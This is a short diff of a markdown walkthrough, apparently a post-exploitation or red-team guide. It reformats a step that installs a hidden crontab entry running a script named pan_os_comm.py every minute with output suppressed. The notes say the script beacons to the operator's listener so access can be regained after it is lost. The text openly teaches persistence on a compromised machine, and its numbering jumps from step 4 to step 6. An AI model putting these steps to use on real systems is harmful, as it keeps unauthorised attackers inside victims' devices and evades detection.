@@ -250,10 +250,14 @@ ls
    `ls -l /usr/local/bin | grep pan_os`
 
 4. Once you’ve confirmed the script is there, it’s time to set up the cron job to maintain persistence. To add the cron job, execute the following command:
-   `(crontab -l 2>/dev/null; echo "* * * * * /usr/bin/python3 /usr/local/bin/pan_os_comm.py >/dev/null 2>&1") | crontab -`
+
+```bash
+(crontab -l 2>/dev/null; echo "* * * * * /usr/bin/python3 /usr/local/bin/pan_os_comm.py >/dev/null 2>&1") | crontab -
+```
+
 NOTE- This will add a cron job that runs every minute, calling your pan_os_comm.py script and sending a beacon to your second listener.
 
-5. To check that your cron job has been successfully added, run the following:
+6. To check that your cron job has been successfully added, run the following:
    `crontab -l`
 NOTE- This should display the current cron jobs, confirming that the job was added. The cron job will send a beacon to your listener every minute, ensuring that even if you lose access, you can reopen the listener using the same port, and it will catch the beacon again.
 
